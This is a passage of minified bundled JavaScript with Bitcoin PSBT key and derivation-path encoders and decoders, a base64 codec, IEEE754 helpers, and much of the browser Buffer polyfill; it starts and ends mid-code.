      if (x.key[0] !== u) throw new Error("Decode Error: could not decode bip32Derivation with key 0x" + Jl(x.key));
      const A = x.key.slice(1);
      if (!f(A)) throw new Error("Decode Error: bip32Derivation has invalid pubkey in key 0x" + Jl(x.key));
      if (x.value.length / 4 % 1 !== 0) throw new Error("Decode Error: Input BIP32_DERIVATION value length should be multiple of 4");
      const v = {
        masterFingerprint: x.value.slice(0, 4),
        pubkey: A,
        path: "m"
      };
      for (const m of $g(x.value.length / 4 - 1)) {
        const B = hd(x.value, m * 4 + 4, "LE"), q = !!(B & 2147483648), X = B & 2147483647;
        v.path += "/" + X.toString(10) + (q ? "'" : "");
      }
      return v;
    }
    function c(x) {
      const A = Uint8Array.from([
        u
      ]), v = od([
        A,
        x.pubkey
      ]), m = x.path.split("/"), B = new Uint8Array(m.length * 4);
      B.set(x.masterFingerprint, 0);
      let q = 4;
      return m.slice(1).forEach((X) => {
        const k = X.slice(-1) === "'";
        let V = 2147483647 & parseInt(k ? X.slice(0, -1) : X, 10);
        k && (V += 2147483648), sd(B, q, V, "LE"), q += 4;
      }), {
        key: v,
        value: B
      };
    }
    const E = "{ masterFingerprint: Uint8Array; pubkey: Uint8Array; path: string; }";
    function b(x) {
      return x.pubkey instanceof Uint8Array && x.masterFingerprint instanceof Uint8Array && typeof x.path == "string" && f(x.pubkey) && x.masterFingerprint.length === 4;
    }
    function p(x, A, v) {
      const m = Jl(A.pubkey);
      return v.has(m) ? false : (v.add(m), x.filter((B) => Je(B.pubkey, A.pubkey) === 0).length === 0);
    }
    return {
      decode: r,
      encode: c,
      check: b,
      expected: E,
      canAddToArray: p
    };
  }
  function Hd(u) {
    return f;
    function f(r) {
      let c;
      if (u.includes(r.key[0]) && (c = r.key.slice(1), !(c.length === 33 || c.length === 65) || ![
        2,
        3,
        4
      ].includes(c[0]))) throw new Error("Format Error: invalid pubkey in key 0x" + Jl(r.key));
      return c;
    }
  }
  function Ld(u) {
    function f(p) {
      if (p.key[0] !== u) throw new Error("Decode Error: could not decode redeemScript with key 0x" + Jl(p.key));
      return p.value;
    }
    function r(p) {
      return {
        key: Uint8Array.from([
          u
        ]),
        value: p
      };
    }
    const c = "Uint8Array";
    function E(p) {
      return p instanceof Uint8Array;
    }
    function b(p, x) {
      return !!p && !!x && p.redeemScript === void 0;
    }
    return {
      decode: f,
      encode: r,
      check: E,
      expected: c,
      canAdd: b
    };
  }
  const Wg = (u) => u.length === 32;
  function Yd(u) {
    const f = m0(u, Wg);
    function r(p) {
      const { numberValue: x, bytes: A } = kg(p.value), v = f.decode({
        key: p.key,
        value: p.value.slice(A + Number(x) * 32)
      }), m = new Array(Number(x));
      for (let B = 0, q = A; B < x; B++, q += 32) m[B] = p.value.slice(q, q + 32);
      return {
        ...v,
        leafHashes: m
      };
    }
    function c(p) {
      const x = f.encode(p), A = wd(p.leafHashes.length), v = new Uint8Array(A);
      Fg(p.leafHashes.length, v);
      const m = od([
        v,
        ...p.leafHashes,
        x.value
      ]);
      return {
        ...x,
        value: m
      };
    }
    const E = "{ masterFingerprint: Uint8Array; pubkey: Uint8Array; path: string; leafHashes: Uint8Array[]; }";
    function b(p) {
      return Array.isArray(p.leafHashes) && p.leafHashes.every((x) => x instanceof Uint8Array && x.length === 32) && f.check(p);
    }
    return {
      decode: r,
      encode: c,
      check: b,
      expected: E,
      canAddToArray: f.canAddToArray
    };
  }
  function Gd(u) {
    function f(p) {
      if (p.key[0] !== u || p.key.length !== 1) throw new Error("Decode Error: could not decode tapInternalKey with key 0x" + Jl(p.key));
      if (p.value.length !== 32) throw new Error("Decode Error: tapInternalKey not a 32-byte x-only pubkey");
      return p.value;
    }
    function r(p) {
      return {
        key: Uint8Array.from([
          u
        ]),
        value: p
      };
    }
    const c = "Uint8Array";
    function E(p) {
      return p instanceof Uint8Array && p.length === 32;
    }
    function b(p, x) {
      return !!p && !!x && p.tapInternalKey === void 0;
    }
    return {
      decode: f,
      encode: r,
      check: E,
      expected: c,
      canAdd: b
    };
  }
  function qd(u) {
    function f(p) {
      if (p.key[0] !== u) throw new Error("Decode Error: could not decode witnessScript with key 0x" + Jl(p.key));
      return p.value;
    }
    function r(p) {
      return {
        key: Uint8Array.from([
          u
        ]),
        value: p
      };
    }
    const c = "Uint8Array";
    function E(p) {
      return p instanceof Uint8Array;
    }
    function b(p, x) {
      return !!p && !!x && p.witnessScript === void 0;
    }
    return {
      decode: f,
      encode: r,
      check: E,
      expected: c,
      canAdd: b
    };
  }
  m0(Gn.BIP32_DERIVATION), Ld(Gn.REDEEM_SCRIPT), qd(Gn.WITNESS_SCRIPT), Hd([
    Gn.PARTIAL_SIG,
    Gn.BIP32_DERIVATION
  ]), Yd(Gn.TAP_BIP32_DERIVATION), Gd(Gn.TAP_INTERNAL_KEY);
  m0(vl.BIP32_DERIVATION), Ld(vl.REDEEM_SCRIPT), qd(vl.WITNESS_SCRIPT), Hd([
    vl.BIP32_DERIVATION
  ]), Yd(vl.TAP_BIP32_DERIVATION), Gd(vl.TAP_INTERNAL_KEY);
  var g0 = {}, Uf = {};
  Uf.byteLength = n8;
  Uf.toByteArray = u8;
  Uf.fromByteArray = f8;
  var yn = [], Ie = [], t8 = typeof Uint8Array < "u" ? Uint8Array : Array, t0 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  for (var Lu = 0, e8 = t0.length; Lu < e8; ++Lu) yn[Lu] = t0[Lu], Ie[t0.charCodeAt(Lu)] = Lu;
  Ie[45] = 62;
  Ie[95] = 63;
  function jd(u) {
    var f = u.length;
    if (f % 4 > 0) throw new Error("Invalid string. Length must be a multiple of 4");
    var r = u.indexOf("=");
    r === -1 && (r = f);
    var c = r === f ? 0 : 4 - r % 4;
    return [
      r,
      c
    ];
  }
  function n8(u) {
    var f = jd(u), r = f[0], c = f[1];
    return (r + c) * 3 / 4 - c;
  }
  function l8(u, f, r) {
    return (f + r) * 3 / 4 - r;
  }
  function u8(u) {
    var f, r = jd(u), c = r[0], E = r[1], b = new t8(l8(u, c, E)), p = 0, x = E > 0 ? c - 4 : c, A;
    for (A = 0; A < x; A += 4) f = Ie[u.charCodeAt(A)] << 18 | Ie[u.charCodeAt(A + 1)] << 12 | Ie[u.charCodeAt(A + 2)] << 6 | Ie[u.charCodeAt(A + 3)], b[p++] = f >> 16 & 255, b[p++] = f >> 8 & 255, b[p++] = f & 255;
    return E === 2 && (f = Ie[u.charCodeAt(A)] << 2 | Ie[u.charCodeAt(A + 1)] >> 4, b[p++] = f & 255), E === 1 && (f = Ie[u.charCodeAt(A)] << 10 | Ie[u.charCodeAt(A + 1)] << 4 | Ie[u.charCodeAt(A + 2)] >> 2, b[p++] = f >> 8 & 255, b[p++] = f & 255), b;
  }
  function a8(u) {
    return yn[u >> 18 & 63] + yn[u >> 12 & 63] + yn[u >> 6 & 63] + yn[u & 63];
  }
  function i8(u, f, r) {
    for (var c, E = [], b = f; b < r; b += 3) c = (u[b] << 16 & 16711680) + (u[b + 1] << 8 & 65280) + (u[b + 2] & 255), E.push(a8(c));
    return E.join("");
  }
  function f8(u) {
    for (var f, r = u.length, c = r % 3, E = [], b = 16383, p = 0, x = r - c; p < x; p += b) E.push(i8(u, p, p + b > x ? x : p + b));
    return c === 1 ? (f = u[r - 1], E.push(yn[f >> 2] + yn[f << 4 & 63] + "==")) : c === 2 && (f = (u[r - 2] << 8) + u[r - 1], E.push(yn[f >> 10] + yn[f >> 4 & 63] + yn[f << 2 & 63] + "=")), E.join("");
  }
  var v0 = {};
  v0.read = function(u, f, r, c, E) {
    var b, p, x = E * 8 - c - 1, A = (1 << x) - 1, v = A >> 1, m = -7, B = r ? E - 1 : 0, q = r ? -1 : 1, X = u[f + B];
    for (B += q, b = X & (1 << -m) - 1, X >>= -m, m += x; m > 0; b = b * 256 + u[f + B], B += q, m -= 8) ;
    for (p = b & (1 << -m) - 1, b >>= -m, m += c; m > 0; p = p * 256 + u[f + B], B += q, m -= 8) ;
    if (b === 0) b = 1 - v;
    else {
      if (b === A) return p ? NaN : (X ? -1 : 1) * (1 / 0);
      p = p + Math.pow(2, c), b = b - v;
    }
    return (X ? -1 : 1) * p * Math.pow(2, b - c);
  };
  v0.write = function(u, f, r, c, E, b) {
    var p, x, A, v = b * 8 - E - 1, m = (1 << v) - 1, B = m >> 1, q = E === 23 ? Math.pow(2, -24) - Math.pow(2, -77) : 0, X = c ? 0 : b - 1, k = c ? 1 : -1, V = f < 0 || f === 0 && 1 / f < 0 ? 1 : 0;
    for (f = Math.abs(f), isNaN(f) || f === 1 / 0 ? (x = isNaN(f) ? 1 : 0, p = m) : (p = Math.floor(Math.log(f) / Math.LN2), f * (A = Math.pow(2, -p)) < 1 && (p--, A *= 2), p + B >= 1 ? f += q / A : f += q * Math.pow(2, 1 - B), f * A >= 2 && (p++, A /= 2), p + B >= m ? (x = 0, p = m) : p + B >= 1 ? (x = (f * A - 1) * Math.pow(2, E), p = p + B) : (x = f * Math.pow(2, B - 1) * Math.pow(2, E), p = 0)); E >= 8; u[r + X] = x & 255, X += k, x /= 256, E -= 8) ;
    for (p = p << E | x, v += E; v > 0; u[r + X] = p & 255, X += k, p /= 256, v -= 8) ;
    u[r + X - k] |= V * 128;
  };
  (function(u) {
    const f = Uf, r = v0, c = typeof Symbol == "function" && typeof Symbol.for == "function" ? /* @__PURE__ */ Symbol.for("nodejs.util.inspect.custom") : null;
    u.Buffer = m, u.SlowBuffer = ot, u.INSPECT_MAX_BYTES = 50;
    const E = 2147483647;
    u.kMaxLength = E;
    const { Uint8Array: b, ArrayBuffer: p, SharedArrayBuffer: x } = globalThis;
    m.TYPED_ARRAY_SUPPORT = A(), !m.TYPED_ARRAY_SUPPORT && typeof console < "u" && typeof console.error == "function" && console.error("This browser lacks typed array (Uint8Array) support which is required by `buffer` v5.x. Use `buffer` v4.x if you require old browser support.");
    function A() {
      try {
        const y = new b(1), o = {
          foo: function() {
            return 42;
          }
        };
        return Object.setPrototypeOf(o, b.prototype), Object.setPrototypeOf(y, o), y.foo() === 42;
      } catch {
        return false;
      }
    }
    Object.defineProperty(m.prototype, "parent", {
      enumerable: true,
      get: function() {
        if (m.isBuffer(this)) return this.buffer;
      }
    }), Object.defineProperty(m.prototype, "offset", {
      enumerable: true,
      get: function() {
        if (m.isBuffer(this)) return this.byteOffset;
      }
    });
    function v(y) {
      if (y > E) throw new RangeError('The value "' + y + '" is invalid for option "size"');
      const o = new b(y);
      return Object.setPrototypeOf(o, m.prototype), o;
    }
    function m(y, o, s) {
      if (typeof y == "number") {
        if (typeof o == "string") throw new TypeError('The "string" argument must be of type string. Received type number');
        return k(y);
      }
      return B(y, o, s);
    }
    m.poolSize = 8192;
    function B(y, o, s) {
      if (typeof y == "string") return V(y, o);
      if (p.isView(y)) return it(y);
      if (y == null) throw new TypeError("The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type " + typeof y);
      if (we(y, p) || y && we(y.buffer, p) || typeof x < "u" && (we(y, x) || y && we(y.buffer, x))) return mt(y, o, s);
      if (typeof y == "number") throw new TypeError('The "value" argument must not be of type number. Received type number');
      const g = y.valueOf && y.valueOf();
      if (g != null && g !== y) return m.from(g, o, s);
      const S = lt(y);
      if (S) return S;
      if (typeof Symbol < "u" && Symbol.toPrimitive != null && typeof y[Symbol.toPrimitive] == "function") return m.from(y[Symbol.toPrimitive]("string"), o, s);
      throw new TypeError("The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type " + typeof y);
    }
    m.from = function(y, o, s) {
      return B(y, o, s);
    }, Object.setPrototypeOf(m.prototype, b.prototype), Object.setPrototypeOf(m, b);
    function q(y) {
      if (typeof y != "number") throw new TypeError('"size" argument must be of type number');
      if (y < 0) throw new RangeError('The value "' + y + '" is invalid for option "size"');
    }
    function X(y, o, s) {
      return q(y), y <= 0 ? v(y) : o !== void 0 ? typeof s == "string" ? v(y).fill(o, s) : v(y).fill(o) : v(y);
    }
    m.alloc = function(y, o, s) {
      return X(y, o, s);
    };
    function k(y) {
      return q(y), v(y < 0 ? 0 : ut(y) | 0);
    }
    m.allocUnsafe = function(y) {
      return k(y);
    }, m.allocUnsafeSlow = function(y) {
      return k(y);
    };
    function V(y, o) {
      if ((typeof o != "string" || o === "") && (o = "utf8"), !m.isEncoding(o)) throw new TypeError("Unknown encoding: " + o);
      const s = Bt(y, o) | 0;
      let g = v(s);
      const S = g.write(y, o);
      return S !== s && (g = g.slice(0, S)), g;
    }
    function nt(y) {
      const o = y.length < 0 ? 0 : ut(y.length) | 0, s = v(o);
      for (let g = 0; g < o; g += 1) s[g] = y[g] & 255;
      return s;
    }
    function it(y) {
      if (we(y, b)) {
        const o = new b(y);
        return mt(o.buffer, o.byteOffset, o.byteLength);
      }
      return nt(y);
    }
    function mt(y, o, s) {
      if (o < 0 || y.byteLength < o) throw new RangeError('"offset" is outside of buffer bounds');
      if (y.byteLength < o + (s || 0)) throw new RangeError('"length" is outside of buffer bounds');
      let g;
      return o === void 0 && s === void 0 ? g = new b(y) : s === void 0 ? g = new b(y, o) : g = new b(y, o, s), Object.setPrototypeOf(g, m.prototype), g;
    }
    function lt(y) {
      if (m.isBuffer(y)) {
        const o = ut(y.length) | 0, s = v(o);
        return s.length === 0 || y.copy(s, 0, 0, o), s;
      }
      if (y.length !== void 0) return typeof y.length != "number" || Pl(y.length) ? v(0) : nt(y);
      if (y.type === "Buffer" && Array.isArray(y.data)) return nt(y.data);
    }
    function ut(y) {
      if (y >= E) throw new RangeError("Attempt to allocate Buffer larger than maximum size: 0x" + E.toString(16) + " bytes");
      return y | 0;
    }
    function ot(y) {
      return +y != y && (y = 0), m.alloc(+y);
    }
    m.isBuffer = function(o) {
      return o != null && o._isBuffer === true && o !== m.prototype;
    }, m.compare = function(o, s) {
      if (we(o, b) && (o = m.from(o, o.offset, o.byteLength)), we(s, b) && (s = m.from(s, s.offset, s.byteLength)), !m.isBuffer(o) || !m.isBuffer(s)) throw new TypeError('The "buf1", "buf2" arguments must be one of type Buffer or Uint8Array');
      if (o === s) return 0;
      let g = o.length, S = s.length;
      for (let z = 0, C = Math.min(g, S); z < C; ++z) if (o[z] !== s[z]) {
        g = o[z], S = s[z];
        break;
      }
      return g < S ? -1 : S < g ? 1 : 0;
    }, m.isEncoding = function(o) {
      switch (String(o).toLowerCase()) {
        case "hex":
        case "utf8":
        case "utf-8":
        case "ascii":
        case "latin1":
        case "binary":
        case "base64":
        case "ucs2":
        case "ucs-2":
        case "utf16le":
        case "utf-16le":
          return true;
        default:
          return false;
      }
    }, m.concat = function(o, s) {
      if (!Array.isArray(o)) throw new TypeError('"list" argument must be an Array of Buffers');
      if (o.length === 0) return m.alloc(0);
      let g;
      if (s === void 0) for (s = 0, g = 0; g < o.length; ++g) s += o[g].length;
      const S = m.allocUnsafe(s);
      let z = 0;
      for (g = 0; g < o.length; ++g) {
        let C = o[g];
        if (we(C, b)) z + C.length > S.length ? (m.isBuffer(C) || (C = m.from(C)), C.copy(S, z)) : b.prototype.set.call(S, C, z);
        else if (m.isBuffer(C)) C.copy(S, z);
        else throw new TypeError('"list" argument must be an Array of Buffers');
        z += C.length;
      }
      return S;
    };
    function Bt(y, o) {
      if (m.isBuffer(y)) return y.length;
      if (p.isView(y) || we(y, p)) return y.byteLength;
      if (typeof y != "string") throw new TypeError('The "string" argument must be one of type string, Buffer, or ArrayBuffer. Received type ' + typeof y);
      const s = y.length, g = arguments.length > 2 && arguments[2] === true;
      if (!g && s === 0) return 0;
      let S = false;
      for (; ; ) switch (o) {
        case "ascii":
        case "latin1":
        case "binary":
          return s;
        case "utf8":
        case "utf-8":
          return Ul(y).length;
        case "ucs2":
        case "ucs-2":
        case "utf16le":
        case "utf-16le":
          return s * 2;
        case "hex":
          return s >>> 1;
        case "base64":
          return $a(y).length;
        default:
          if (S) return g ? -1 : Ul(y).length;
          o = ("" + o).toLowerCase(), S = true;
      }
    }
    m.byteLength = Bt;
    function ft(y, o, s) {
      let g = false;
      if ((o === void 0 || o < 0) && (o = 0), o > this.length || ((s === void 0 || s > this.length) && (s = this.length), s <= 0) || (s >>>= 0, o >>>= 0, s <= o)) return "";
      for (y || (y = "utf8"); ; ) switch (y) {
        case "hex":
          return G(this, o, s);
        case "utf8":
        case "utf-8":
          return K(this, o, s);
        case "ascii":
          return Ut(this, o, s);
        case "latin1":
        case "binary":
          return U(this, o, s);
        case "base64":
          return H(this, o, s);
        case "ucs2":
        case "ucs-2":
        case "utf16le":
        case "utf-16le":
          return Q(this, o, s);
        default:
          if (g) throw new TypeError("Unknown encoding: " + y);
          y = (y + "").toLowerCase(), g = true;
      }
    }
    m.prototype._isBuffer = true;
    function zt(y, o, s) {
      const g = y[o];
      y[o] = y[s], y[s] = g;
    }
    m.prototype.swap16 = function() {
      const o = this.length;
      if (o % 2 !== 0) throw new RangeError("Buffer size must be a multiple of 16-bits");
      for (let s = 0; s < o; s += 2) zt(this, s, s + 1);
      return this;
    }, m.prototype.swap32 = function() {
      const o = this.length;
      if (o % 4 !== 0) throw new RangeError("Buffer size must be a multiple of 32-bits");
      for (let s = 0; s < o; s += 4) zt(this, s, s + 3), zt(this, s + 1, s + 2);
      return this;
    }, m.prototype.swap64 = function() {
      const o = this.length;
      if (o % 8 !== 0) throw new RangeError("Buffer size must be a multiple of 64-bits");
      for (let s = 0; s < o; s += 8) zt(this, s, s + 7), zt(this, s + 1, s + 6), zt(this, s + 2, s + 5), zt(this, s + 3, s + 4);
      return this;
    }, m.prototype.toString = function() {
      const o = this.length;
      return o === 0 ? "" : arguments.length === 0 ? K(this, 0, o) : ft.apply(this, arguments);
    }, m.prototype.toLocaleString = m.prototype.toString, m.prototype.equals = function(o) {
      if (!m.isBuffer(o)) throw new TypeError("Argument must be a Buffer");
      return this === o ? true : m.compare(this, o) === 0;
    }, m.prototype.inspect = function() {
      let o = "";
      const s = u.INSPECT_MAX_BYTES;
      return o = this.toString("hex", 0, s).replace(/(.{2})/g, "$1 ").trim(), this.length > s && (o += " ... "), "<Buffer " + o + ">";
    }, c && (m.prototype[c] = m.prototype.inspect), m.prototype.compare = function(o, s, g, S, z) {
      if (we(o, b) && (o = m.from(o, o.offset, o.byteLength)), !m.isBuffer(o)) throw new TypeError('The "target" argument must be one of type Buffer or Uint8Array. Received type ' + typeof o);
      if (s === void 0 && (s = 0), g === void 0 && (g = o ? o.length : 0), S === void 0 && (S = 0), z === void 0 && (z = this.length), s < 0 || g > o.length || S < 0 || z > this.length) throw new RangeError("out of range index");
      if (S >= z && s >= g) return 0;
      if (S >= z) return -1;
      if (s >= g) return 1;
      if (s >>>= 0, g >>>= 0, S >>>= 0, z >>>= 0, this === o) return 0;
      let C = z - S, rt = g - s;
      const qt = Math.min(C, rt), wt = this.slice(S, z), Mt = o.slice(s, g);
      for (let Et = 0; Et < qt; ++Et) if (wt[Et] !== Mt[Et]) {
        C = wt[Et], rt = Mt[Et];
        break;
      }
      return C < rt ? -1 : rt < C ? 1 : 0;
    };
    function he(y, o, s, g, S) {
      if (y.length === 0) return -1;
      if (typeof s == "string" ? (g = s, s = 0) : s > 2147483647 ? s = 2147483647 : s < -2147483648 && (s = -2147483648), s = +s, Pl(s) && (s = S ? 0 : y.length - 1), s < 0 && (s = y.length + s), s >= y.length) {
        if (S) return -1;
        s = y.length - 1;
      } else if (s < 0) if (S) s = 0;
      else return -1;
      if (typeof o == "string" && (o = m.from(o, g)), m.isBuffer(o)) return o.length === 0 ? -1 : Te(y, o, s, g, S);
      if (typeof o == "number") return o = o & 255, typeof b.prototype.indexOf == "function" ? S ? b.prototype.indexOf.call(y, o, s) : b.prototype.lastIndexOf.call(y, o, s) : Te(y, [
        o
      ], s, g, S);
      throw new TypeError("val must be string, number or Buffer");
    }
    function Te(y, o, s, g, S) {
      let z = 1, C = y.length, rt = o.length;
      if (g !== void 0 && (g = String(g).toLowerCase(), g === "ucs2" || g === "ucs-2" || g === "utf16le" || g === "utf-16le")) {
        if (y.length < 2 || o.length < 2) return -1;
        z = 2, C /= 2, rt /= 2, s /= 2;
      }
      function qt(Mt, Et) {
        return z === 1 ? Mt[Et] : Mt.readUInt16BE(Et * z);
      }
      let wt;
      if (S) {
        let Mt = -1;
        for (wt = s; wt < C; wt++) if (qt(y, wt) === qt(o, Mt === -1 ? 0 : wt - Mt)) {
          if (Mt === -1 && (Mt = wt), wt - Mt + 1 === rt) return Mt * z;
        } else Mt !== -1 && (wt -= wt - Mt), Mt = -1;
      } else for (s + rt > C && (s = C - rt), wt = s; wt >= 0; wt--) {
        let Mt = true;
        for (let Et = 0; Et < rt; Et++) if (qt(y, wt + Et) !== qt(o, Et)) {
          Mt = false;
          break;
        }
        if (Mt) return wt;
      }
      return -1;
    }
    m.prototype.includes = function(o, s, g) {
      return this.indexOf(o, s, g) !== -1;
    }, m.prototype.indexOf = function(o, s, g) {
      return he(this, o, s, g, true);
    }, m.prototype.lastIndexOf = function(o, s, g) {
      return he(this, o, s, g, false);
    };
    function Ce(y, o, s, g) {
      s = Number(s) || 0;
      const S = y.length - s;
      g ? (g = Number(g), g > S && (g = S)) : g = S;
      const z = o.length;
      g > z / 2 && (g = z / 2);
      let C;
      for (C = 0; C < g; ++C) {
        const rt = parseInt(o.substr(C * 2, 2), 16);
        if (Pl(rt)) return C;
        y[s + C] = rt;
      }
      return C;
    }
    function de(y, o, s, g) {
      return ne(Ul(o, y.length - s), y, s, g);
    }
    function pn(y, o, s, g) {
      return ne(Iu(o), y, s, g);
    }
    function We(y, o, s, g) {
      return ne($a(o), y, s, g);
    }
    function Se(y, o, s, g) {
      return ne(Rf(o, y.length - s), y, s, g);
    }
    m.prototype.write = function(o, s, g, S) {
      if (s === void 0) S = "utf8", g = this.length, s = 0;
      else if (g === void 0 && typeof s == "string") S = s, g = this.length, s = 0;
      else if (isFinite(s)) s = s >>> 0, isFinite(g) ? (g = g >>> 0, S === void 0 && (S = "utf8")) : (S = g, g = void 0);
      else throw new Error("Buffer.write(string, encoding, offset[, length]) is no longer supported");
      const z = this.length - s;
      if ((g === void 0 || g > z) && (g = z), o.length > 0 && (g < 0 || s < 0) || s > this.length) throw new RangeError("Attempt to write outside buffer bounds");
      S || (S = "utf8");
      let C = false;
      for (; ; ) switch (S) {
        case "hex":
          return Ce(this, o, s, g);
        case "utf8":
        case "utf-8":
          return de(this, o, s, g);
        case "ascii":
        case "latin1":
        case "binary":
          return pn(this, o, s, g);
        case "base64":
          return We(this, o, s, g);
        case "ucs2":
        case "ucs-2":
        case "utf16le":
        case "utf-16le":
          return Se(this, o, s, g);
        default:
          if (C) throw new TypeError("Unknown encoding: " + S);
          S = ("" + S).toLowerCase(), C = true;
      }
    }, m.prototype.toJSON = function() {
      return {
        type: "Buffer",
        data: Array.prototype.slice.call(this._arr || this, 0)
      };
    };
    function H(y, o, s) {
      return o === 0 && s === y.length ? f.fromByteArray(y) : f.fromByteArray(y.slice(o, s));
    }
    function K(y, o, s) {
      s = Math.min(y.length, s);
      const g = [];
      let S = o;
      for (; S < s; ) {
        const z = y[S];
        let C = null, rt = z > 239 ? 4 : z > 223 ? 3 : z > 191 ? 2 : 1;
        if (S + rt <= s) {
          let qt, wt, Mt, Et;
          switch (rt) {
            case 1:
              z < 128 && (C = z);
              break;
            case 2:
              qt = y[S + 1], (qt & 192) === 128 && (Et = (z & 31) << 6 | qt & 63, Et > 127 && (C = Et));
              break;
            case 3:
              qt = y[S + 1], wt = y[S + 2], (qt & 192) === 128 && (wt & 192) === 128 && (Et = (z & 15) << 12 | (qt & 63) << 6 | wt & 63, Et > 2047 && (Et < 55296 || Et > 57343) && (C = Et));
              break;
            case 4:
              qt = y[S + 1], wt = y[S + 2], Mt = y[S + 3], (qt & 192) === 128 && (wt & 192) === 128 && (Mt & 192) === 128 && (Et = (z & 15) << 18 | (qt & 63) << 12 | (wt & 63) << 6 | Mt & 63, Et > 65535 && Et < 1114112 && (C = Et));
          }
        }
        C === null ? (C = 65533, rt = 1) : C > 65535 && (C -= 65536, g.push(C >>> 10 & 1023 | 55296), C = 56320 | C & 1023), g.push(C), S += rt;
      }
      return St(g);
    }
    const P = 4096;
    function St(y) {
      const o = y.length;
      if (o <= P) return String.fromCharCode.apply(String, y);
      let s = "", g = 0;
      for (; g < o; ) s += String.fromCharCode.apply(String, y.slice(g, g += P));
      return s;
    }
    function Ut(y, o, s) {
      let g = "";
      s = Math.min(y.length, s);
      for (let S = o; S < s; ++S) g += String.fromCharCode(y[S] & 127);
      return g;
    }
    function U(y, o, s) {
      let g = "";
      s = Math.min(y.length, s);
      for (let S = o; S < s; ++S) g += String.fromCharCode(y[S]);
      return g;
    }
    function G(y, o, s) {
      const g = y.length;
      (!o || o < 0) && (o = 0), (!s || s < 0 || s > g) && (s = g);
      let S = "";
      for (let z = o; z < s; ++z) S += Pa[y[z]];
      return S;
    }
    function Q(y, o, s) {
      const g = y.slice(o, s);
      let S = "";
      for (let z = 0; z < g.length - 1; z += 2) S += String.fromCharCode(g[z] + g[z + 1] * 256);
      return S;
    }
    m.prototype.slice = function(o, s) {
      const g = this.length;
      o = ~~o, s = s === void 0 ? g : ~~s, o < 0 ? (o += g, o < 0 && (o = 0)) : o > g && (o = g), s < 0 ? (s += g, s < 0 && (s = 0)) : s > g && (s = g), s < o && (s = o);
      const S = this.subarray(o, s);
      return Object.setPrototypeOf(S, m.prototype), S;
    };
    function j(y, o, s) {
      if (y % 1 !== 0 || y < 0) throw new RangeError("offset is not uint");
      if (y + o > s) throw new RangeError("Trying to access beyond buffer length");
    }
    m.prototype.readUintLE = m.prototype.readUIntLE = function(o, s, g) {
      o = o >>> 0, s = s >>> 0, g || j(o, s, this.length);
      let S = this[o], z = 1, C = 0;
      for (; ++C < s && (z *= 256); ) S += this[o + C] * z;
      return S;
    }, m.prototype.readUintBE = m.prototype.readUIntBE = function(o, s, g) {
      o = o >>> 0, s = s >>> 0, g || j(o, s, this.length);
      let S = this[o + --s], z = 1;
      for (; s > 0 && (z *= 256); ) S += this[o + --s] * z;
      return S;
    }, m.prototype.readUint8 = m.prototype.readUInt8 = function(o, s) {
      return o = o >>> 0, s || j(o, 1, this.length), this[o];
    }, m.prototype.readUint16LE = m.prototype.readUInt16LE = function(o, s) {
      return o = o >>> 0, s || j(o, 2, this.length), this[o] | this[o + 1] << 8;
    }, m.prototype.readUint16BE = m.prototype.readUInt16BE = function(o, s) {
      return o = o >>> 0, s || j(o, 2, this.length), this[o] << 8 | this[o + 1];
    }, m.prototype.readUint32LE = m.prototype.readUInt32LE = function(o, s) {
      return o = o >>> 0, s || j(o, 4, this.length), (this[o] | this[o + 1] << 8 | this[o + 2] << 16) + this[o + 3] * 16777216;
    }, m.prototype.readUint32BE = m.prototype.readUInt32BE = function(o, s) {
      return o = o >>> 0, s || j(o, 4, this.length), this[o] * 16777216 + (this[o + 1] << 16 | this[o + 2] << 8 | this[o + 3]);
    }, m.prototype.readBigUInt64LE = Ue(function(o) {
      o = o >>> 0, an(o, "offset");
      const s = this[o], g = this[o + 7];
      (s === void 0 || g === void 0) && Sl(o, this.length - 8);
      const S = s + this[++o] * 2 ** 8 + this[++o] * 2 ** 16 + this[++o] * 2 ** 24, z = this[++o] + this[++o] * 2 ** 8 + this[++o] * 2 ** 16 + g * 2 ** 24;
      return BigInt(S) + (BigInt(z) << BigInt(32));
    }), m.prototype.readBigUInt64BE = Ue(function(o) {
      o = o >>> 0, an(o, "offset");
      const s = this[o], g = this[o + 7];
      (s === void 0 || g === void 0) && Sl(o, this.length - 8);
      const S = s * 2 ** 24 + this[++o] * 2 ** 16 + this[++o] * 2 ** 8 + this[++o], z = this[++o] * 2 ** 24 + this[++o] * 2 ** 16 + this[++o] * 2 ** 8 + g;
      return (BigInt(S) << BigInt(32)) + BigInt(z);
    }), m.prototype.readIntLE = function(o, s, g) {
      o = o >>> 0, s = s >>> 0, g || j(o, s, this.length);
      let S = this[o], z = 1, C = 0;
      for (; ++C < s && (z *= 256); ) S += this[o + C] * z;
      return z *= 128, S >= z && (S -= Math.pow(2, 8 * s)), S;
    }, m.prototype.readIntBE = function(o, s, g) {
      o = o >>> 0, s = s >>> 0, g || j(o, s, this.length);
      let S = s, z = 1, C = this[o + --S];
      for (; S > 0 && (z *= 256); ) C += this[o + --S] * z;
      return z *= 128, C >= z && (C -= Math.pow(2, 8 * s)), C;
    }, m.prototype.readInt8 = function(o, s) {
      return o = o >>> 0, s || j(o, 1, this.length), this[o] & 128 ? (255 - this[o] + 1) * -1 : this[o];
    }, m.prototype.readInt16LE = function(o, s) {
      o = o >>> 0, s || j(o, 2, this.length);
      const g = this[o] | this[o + 1] << 8;
      return g & 32768 ? g | 4294901760 : g;
    }, m.prototype.readInt16BE = function(o, s) {
      o = o >>> 0, s || j(o, 2, this.length);
      const g = this[o + 1] | this[o] << 8;
      return g & 32768 ? g | 4294901760 : g;
    }, m.prototype.readInt32LE = function(o, s) {
      return o = o >>> 0, s || j(o, 4, this.length), this[o] | this[o + 1] << 8 | this[o + 2] << 16 | this[o + 3] << 24;
    }, m.prototype.readInt32BE = function(o, s) {
      return o = o >>> 0, s || j(o, 4, this.length), this[o] << 24 | this[o + 1] << 16 | this[o + 2] << 8 | this[o + 3];
    }, m.prototype.readBigInt64LE = Ue(function(o) {
      o = o >>> 0, an(o, "offset");
      const s = this[o], g = this[o + 7];
      (s === void 0 || g === void 0) && Sl(o, this.length - 8);
      const S = this[o + 4] + this[o + 5] * 2 ** 8 + this[o + 6] * 2 ** 16 + (g << 24);
      return (BigInt(S) << BigInt(32)) + BigInt(s + this[++o] * 2 ** 8 + this[++o] * 2 ** 16 + this[++o] * 2 ** 24);
